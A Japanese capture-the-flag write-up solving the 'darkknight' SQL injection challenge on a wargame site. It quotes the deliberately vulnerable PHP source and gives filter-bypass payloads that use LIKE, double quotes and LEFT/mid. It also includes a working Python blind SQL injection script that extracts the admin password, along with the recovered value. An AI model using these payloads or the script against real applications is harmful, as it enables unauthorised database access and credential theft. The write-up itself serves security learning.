# darkknight

## answer

- [darkknight](../src/darkknight.py)

## problem

```
query : select id from prob_darkknight where id='guest' and pw='' and no=

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

## memo

試しに、

```
https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1&no=2
```

とすると

```
query : select id from prob_darkknight where id='guest' and pw='1' and no=2
```

となった。

コードを読んでいく。

```
if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
```

pw、noで禁止されている文字が少し違う。

```
?pw=1&no=2 or 1
```

とかしてみると、「Hello guest」が表示される。

'は"、=はlikeで置き換えをする。

```
?pw=1&no=2 or id like "admin" and length(pw) like 8
```

```
https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1&no=2%20or%20id%20like%20%22admin%22%20and%20length(pw)%20like%208

query : select id from prob_darkknight where id='guest' and pw='1' and no=2 or id like "admin" and length(pw) like 8

Hello admin
```

substrがpreg_matchによってサニタイズされているので、substringも使えない。

LEFT関数というものがある。使い方は以下のよう。

```
mysql> SELECT LEFT('foobarbar', 5);
        -> 'fooba'
```

これをふまえた上で、調査してみる。

```
?pw=1&no=2 or id like "admin" and LEFT(pw, 1) < "A"

?pw=1&no=2 or id like "admin" and LEFT(pw, 1) > "A"
```

上だけHello adminが返される。Blind SQLiで解けそう。

コードをかくぜ

```
#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php"
    ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
    headers = {'User-Agent': ua}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXXXX')

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    password = ""
    for count in range(1, 10):
        for char in chars:
            val = '2 or id like \"admin\" and mid(pw,{count},1) like \"{char}\"'.format(count = count, char = char)
            params = {'no': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                print(password)
                break
            if char == 'Z':
                print("not found")
                return
            time.sleep(0.1)
    print(password)

if __name__ == "__main__":
    main()
```

最後に、取れたパスワードを使って、以下を入力

```
https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?pw=1c62ba6f
```

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [addslashes | php manual](https://www.php.net/manual/ja/function.addslashes.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)

- [文字列関数 | mysql manual](https://dev.mysql.com/doc/refman/5.6/ja/string-functions.html)

- [文字列の左側から文字列を取り出す | yulib blog](http://db.yulib.com/mysql/000040.html)
